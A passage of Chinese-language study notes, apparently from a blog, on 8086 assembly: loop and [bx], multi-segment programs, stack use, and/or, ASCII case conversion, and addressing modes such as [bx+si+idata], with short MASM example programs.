ends</span><br></pre></td></tr></table></figure><ol><li>指出程序要在何处结束</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol><li>abc被当作代码段来用，所以应该将abc和cs联系起来</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol><li>程序返回</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol><li>语法错误和逻辑错误</li></ol><h2 id="4-5-编译"><a href="#4-5-编译" class="headerlink" title="4.5 编译"></a>4.5 编译</h2><p>源程序文件.asm-&gt;目标文件.obj</p><h2 id="4-6-连接"><a href="#4-6-连接" class="headerlink" title="4.6 连接"></a>4.6 连接</h2><p>目标文件.obj-&gt;可执行文件.exe</p><h1 id="5-bx-和loop指令"><a href="#5-bx-和loop指令" class="headerlink" title="5. [bx]和loop指令"></a>5. [bx]和loop指令</h1><p>[bx]同样表示一个内存单元，它的偏移地址在bx中。</p><p>“()”中的元素可以有3种类型：①寄存器名；②段寄存器名；③内存单元的物理地址。</p><p>(ax)表示ax中的内容，(20000H)表示内存20000H单元的内容，((ds)<em>16+(bx))表示ds中的内容为ADR1，bx中的内容为ADR2，内存ADR1\</em>16+ADR2单元的内容，即内存ADR1:ADR2单元的内容。</p><p>约定idata表示常量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[idata]</span><br><span class="line">mov ax,idata</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx];(ax)=((ds)*16+(bx))</span><br><span class="line">mov [bx],ax;((ds)*16+(bx))=(ax)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inc bx;inc bx的含义是bx中的内容加1</span><br></pre></td></tr></table></figure><h2 id="5-1-loop指令"><a href="#5-1-loop指令" class="headerlink" title="5.1 loop指令"></a>5.1 loop指令</h2><p>loop指令的格式：loop 标号</p><p>CPU执行loop指令的时候要进行两步操作：</p><ol><li>(cx)=(cx)-1</li><li>判断cx中的值，不为零则转至标号处执行程序，为零则向下执行</li></ol><p>编程运算$2^{12}$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,2</span><br><span class="line">mov cx,11</span><br><span class="line">s:add ax,ax</span><br><span class="line">loop s</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>cx和loop指令相配合实现循环功能：①在cx中存放循环次数；②loop指令中的标号所标识地址要在前面；③要循环执行的程序段，要写在标号和loop指令的中间。</p><p><strong>在汇编源程序，数据不能以字母开头</strong>，所以要在前面加0。<code>A000H</code>在汇编源程序中要写为<code>0A000H</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al,[0];(al)=0,将常量0送入al中(mov al,0含义相同)</span><br><span class="line">mov al,ds:[0];(al)=((ds)*16+0),将内存单元中的数据送入al中</span><br><span class="line">mov al,[bx];(al)=((ds)*16+(bx)),将内存单元中的数据送入al中</span><br><span class="line">mov al,ds:[bx];与mov al,[bx]含义相同</span><br></pre></td></tr></table></figure><p>（1）在汇编源程序中，如果用指令访问一个内存单元，则在指令中必须用”[]“来表示存储单元，如果在”[]“里用一个常量idata直接给出内存单元的偏移地址，就要在”[]“的前面显式地给出段地址所在的寄存器。比如<code>mov al,ds:[0]</code></p><p>如果没有在”[]“的前面显式地给出段地址所在的段寄存器，那么编译器会把指令中的[idata]解释为data，比如<code>mov al,[0]</code></p><p>（2）如果在”[]“里用寄存器，比如bx，间接给出内存单元的偏移地址，则段地址默认在ds中。当然也可以显式地给出段地址所在的段寄存器。</p><h2 id="5-2-一段安全的空间"><a href="#5-2-一段安全的空间" class="headerlink" title="5.2 一段安全的空间"></a>5.2 一段安全的空间</h2><p>我们需要直接向一段内存中写入内容，这段内存空间不应存放系统或其他程序的数据或代码，否则写入操作很可能引发错误。DOS方式下，一般情况，0:200~0:2ff空间中没有系统或其他程序的数据或代码。</p><h2 id="5-3-loop和-bx-的联合应用"><a href="#5-3-loop和-bx-的联合应用" class="headerlink" title="5.3 loop和[bx]的联合应用"></a>5.3 loop和[bx]的联合应用</h2><p>在循环中，源始单元ffff:X和目标单元0020:X的偏移地址X是变量，可以用bx来存放。</p><h2 id="5-4-段前缀"><a href="#5-4-段前缀" class="headerlink" title="5.4 段前缀"></a>5.4 段前缀</h2><img src="/posts/de6e58e0/%E6%AE%B5%E5%89%8D%E7%BC%80.PNG" class="" title="段前缀"><h1 id="6-包含多个段的程序"><a href="#6-包含多个段的程序" class="headerlink" title="6. 包含多个段的程序"></a>6. 包含多个段的程序</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">mov bx,0</span><br><span class="line">mov ax,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:add ax,cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>dw即define word，定义字型数据。</p><p>程序在运行的时候CS中存放代码段的段地址，所以可以从CS中得到它们的段地址。dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据就在代码段的偏移0、2、4、6、8、A、C、E处。程序运行时，它们的地址就是cs:0, cs:2, cs:4, cs:6, cs:8, cs:a, cs:c, cs:e。</p><p>end除了通知编译器程序结束外，还可以通知编译器程序的入口在什么地方。<code>end 标号</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">start:mov bx,0;程序的第一条指令</span><br><span class="line">mov ax,0</span><br><span class="line"></span><br><span class="line">        mov cx,8</span><br><span class="line">    s:add ax,cs:[bx]</span><br><span class="line">        add bx,2</span><br><span class="line">        loop s</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="6-1-在代码段中使用栈"><a href="#6-1-在代码段中使用栈" class="headerlink" title="6.1 在代码段中使用栈"></a>6.1 在代码段中使用栈</h2><p>程序运行时，定义的数据存放在cs:0~cs:F单元中，共8个字单元。依次将这8个字单元中的数据入栈，然后再依次出栈到这8个字单元中，从而实现数据的逆序存放。（将cs:10~cs:2F的内存空间当作栈来用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">;用dw定义16个字型数据，在程序加载后，将取得16个字的内存空间存放这16个数据</span><br><span class="line">;在后面的程序中将这段空间当作栈来使用</span><br><span class="line">start:mov ax,cs</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,30h;将设置栈顶ss:sp指向cs:30</span><br><span class="line"></span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,8</span><br><span class="line">s:push cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s;将代码段0~15单元中的8个字型数据依次入栈</span><br><span class="line"></span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,8</span><br><span class="line">s0:pop cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s0;出栈8个字型数据到代码段0~15单元中</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start;指明程序的入口在start处</span><br></pre></td></tr></table></figure><h2 id="6-2-将数据、代码、栈放入不同的段"><a href="#6-2-将数据、代码、栈放入不同的段" class="headerlink" title="6.2 将数据、代码、栈放入不同的段"></a>6.2 将数据、代码、栈放入不同的段</h2><p>在前面的内容中，我们在程序中用到了数据和栈，将数据、栈和代码都放到了一个段里面。我们在编程的时候要注意何处是数据，何处是栈，何处是代码。这样做会产生两个问题：</p><ol><li>把它们放到一个段中使程序显得混乱</li><li>前面数据中处理的数据很少，用到的栈空间也小，加上没有多长的代码，放到一个段里面没有问题。但如果数据、栈、代码需要的空间超过64KB，就不能放在一个段中（8086模式中一个段的容量不能大于64KB）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line">data segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">data ends</span><br><span class="line">stack segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">stack ends</span><br><span class="line">code segment</span><br><span class="line">start:mov ax,stack;将名为stack段的段地址送入ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,20h</span><br><span class="line">;设置栈顶ss:sp指向stack:20(在整个程序中是cs:30,但在栈段是从0:10~0:2F,所以是stack:20)</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax;ds指向data段</span><br><span class="line">mov bx,0;ds:bx指向data段中的第一个单元</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:push [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s;将data段中的0~15单元中的8个字型数据依次入栈</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s0:pop [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s0;依次出栈8个字型数据到data段的0~15单元中</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="7-更灵活的定位内存地址的方法"><a href="#7-更灵活的定位内存地址的方法" class="headerlink" title="7. 更灵活的定位内存地址的方法"></a>7. 更灵活的定位内存地址的方法</h1><h2 id="7-1-and和or指令"><a href="#7-1-and和or指令" class="headerlink" title="7.1 and和or指令"></a>7.1 and和or指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">and指令:逻辑与指令，按位进行与运算(1and1=1,1and0=0,0and0=0)</span><br><span class="line">mov al,01100011B</span><br><span class="line">and al,00111011B</span><br><span class="line">执行后:al=00100011B</span><br><span class="line"></span><br><span class="line">or指令:逻辑或指令，按位进行或运算(1or1=1,1or0=1,0or0=0)</span><br><span class="line">mov al,01100011B</span><br><span class="line">or al,00111011B</span><br><span class="line">执行后:al=01111011B</span><br></pre></td></tr></table></figure><h2 id="7-2-ASCII码"><a href="#7-2-ASCII码" class="headerlink" title="7.2 ASCII码"></a>7.2 ASCII码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a-&gt;61h,b-&gt;62h</span><br></pre></td></tr></table></figure><h2 id="7-3-以字符形式给出的数据"><a href="#7-3-以字符形式给出的数据" class="headerlink" title="7.3 以字符形式给出的数据"></a>7.3 以字符形式给出的数据</h2><p>在汇编程序中，用’’的方式指明数据是以字符的形式给出的，编译器将它们转化为相对应的ASCII码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data</span><br><span class="line">data segment</span><br><span class="line">db &#x27;unIX&#x27;</span><br><span class="line">db &#x27;foRK&#x27;</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:mov al,&#x27;a&#x27;</span><br><span class="line">mov bl,&#x27;b&#x27;</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="7-4-大小写转换的问题"><a href="#7-4-大小写转换的问题" class="headerlink" title="7.4 大小写转换的问题"></a>7.4 大小写转换的问题</h2><p>在codesg中填写代码，将tadasg中的第一个字符串转化为大写，第二个字符串转化为小写。</p><img src="/posts/de6e58e0/ASCII%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6.jpg" class="" title="ASCII码表"><p>方法一：小写字母的ASCII码值比大写字母的ASCII码值大20H。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;BaSiC&#x27;</span><br><span class="line">db &#x27;iNfOrMaTiOn&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,5</span><br><span class="line">s:mov al,[bx]</span><br><span class="line">如果(al)&gt;61H,则为小写字母的ASCII码,则:sub al,20h</span><br><span class="line">mov [bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>方法二：大写字母的第6位全为0，小写字母的第6位全为1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;BaSiC&#x27;</span><br><span class="line">db &#x27;iNfOrMaTiOn&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax;设置ds指向datasg段</span><br><span class="line">mov bx,0;设置(bx)=0,ds:bx指向&#x27;BaSiC&#x27;的第一个字母</span><br><span class="line">mov cx,5</span><br><span class="line">s:mov al,[bx];将ASCII码从ds:bx所指向的单元中取出</span><br><span class="line">and al,11011111B;将al中的ASCII码的第6位置0,变为大写字母</span><br><span class="line">mov [bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov bx,5;设置(bx)=5,ds:bx指向&#x27;iNfOrMaTiOn&#x27;的第一个字母</span><br><span class="line">mov cx,11</span><br><span class="line">s0: mov al,[bx]</span><br><span class="line">or al,00100000B</span><br><span class="line">mov [bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="7-5-bx-idata"><a href="#7-5-bx-idata" class="headerlink" title="7.5 [bx+idata]"></a>7.5 [bx+idata]</h2><p>[bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata</p><p>mov ax,[bx+200]-&gt;(ax)=((ds)*16+(bx)+200)</p><p>简化7.4方法二(但这个一定要两个字符串长度相同)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    mov ax,datasg</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov bx,0</span><br><span class="line"></span><br><span class="line">    mov cx,5</span><br><span class="line">s:mov al,[bx];定位第一个字符串中的字符</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx],al</span><br><span class="line">mov al,[5+bx];定位第二个字符串中的字符</span><br><span class="line">or al,00100000b</span><br><span class="line">mov [5+bx],al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>[bx]=0[bx]，[5+bx]=5[bx]</p><h2 id="7-6-SI-和-DI"><a href="#7-6-SI-和-DI" class="headerlink" title="7.6 SI 和 DI"></a>7.6 SI 和 DI</h2><p>si 和 di不能够分成两个8位寄存器来使用。</p><p>用ds:si指向要复制的源始字符串，用ds:di指向复制的目的空间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line"> db &#x27;welcome to masm!&#x27;</span><br><span class="line"> db &#x27;................&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0</span><br><span class="line">mov di,16;复制到它后面的数据区，后面数据区的偏移地址为16</span><br><span class="line"></span><br><span class="line">mov cx,8;一次复制2个字节，一共循环8次</span><br><span class="line">s:mov ax,[si]</span><br><span class="line">mov [di],ax</span><br><span class="line">add si,2</span><br><span class="line">add di,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>利用[bx(si或di)+idata]的方式使程序变简洁：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0</span><br><span class="line">mov cx,8</span><br><span class="line">s:mov ax,0[si]</span><br><span class="line">mov 16[si],ax</span><br><span class="line">add si,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="7-7-bx-si-和-bx-di"><a href="#7-7-bx-si-和-bx-di" class="headerlink" title="7.7 [bx+si]和[bx+di]"></a>7.7 [bx+si]和[bx+di]</h2><p>[bx+si]表示一个内存单元，它的偏移地址为(bx)+(si)，[bx+di]同。</p><p>mov ax,[bx+si]-&gt;(ax)=((ds)*16+(bx)+(si))</p><p>mov ax,[bx+si]=mov ax,[bx][si]</p><h2 id="7-8-bx-si-idata-和-bx-di-idata"><a href="#7-8-bx-si-idata-和-bx-di-idata" class="headerlink" title="7.8 [bx+si+idata]和[bx+di+idata]"></a>7.8 [bx+si+idata]和[bx+di+idata]</h2><p>[bx+si+idata]表示一个内存单元，它的偏移地址为(bx)+(si)+idata，[bx+di+idata]同。</p><p>mov ax,[bx+si+idata]-&gt;(ax)=((ds)*16+(bx)+(si)+idata)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  mov ax,[bx+si+idata]</span><br><span class="line">= mov ax,idata[bx][si]</span><br><span class="line">= mov ax,[bx].idata[si]</span><br><span class="line">= mov ax,[bx][si].idata</span><br></pre></td></tr></table></figure><h2 id="7-9-不同寻址方式的灵活应用"><a href="#7-9-不同寻址方式的灵活应用" class="headerlink" title="7.9 不同寻址方式的灵活应用"></a>7.9 不同寻址方式的灵活应用</h2><p>编程，将datasg段中每个单词首字母改为大写字母(用bx定位每行的起始地址，用3定位要修改的列，用[bx+idata]对目标单元进行寻址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;1..file.........&#x27;;16个字节</span><br><span class="line">db &#x27;2..edit.........&#x27;</span><br><span class="line">db &#x27;3..search.......&#x27;</span><br><span class="line">db &#x27;4..view.........&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start: mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s:  mov al,[bx+3]</span><br><span class="line">and al,11011111b</span><br><span class="line">        mov [bx+3],al</span><br><span class="line">add bx,16</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>编程，将datasg段中每个单词改为大写字母(用bx定位每行的起始地址，用si定位要修改的列，用[bx+si]方式对目标单元进行寻址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;ibm.............&#x27;</span><br><span class="line">db &#x27;dec.............&#x27;</span><br><span class="line">db &#x27;dos.............&#x27;</span><br><span class="line">db &#x27;vax.............&#x27;</span><br><span class="line">datasg ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,datasg</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,4</span><br><span class="line">s0: mov dx,cx;将外层循环的cx值保存在dx中</span><br><span class="line">mov si,0</span><br><span class="line"></span><br><span class="line">mov cx,3;cx设置为内层循环的次数</span><br><span class="line">s:mov al,[bx+si]</span><br><span class="line">and al,11011111b</span><br><span class="line">mov [bx+si],al</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">add bx,16</span><br><span class="line">mov cx,dx;用dx中存放的外层循环的计数值恢复cx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>如果dx也被用了呢？所有寄存器都被用了呢？可以使用内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">db &#x27;ibm.............&#x27;</span><br><span class="line">db 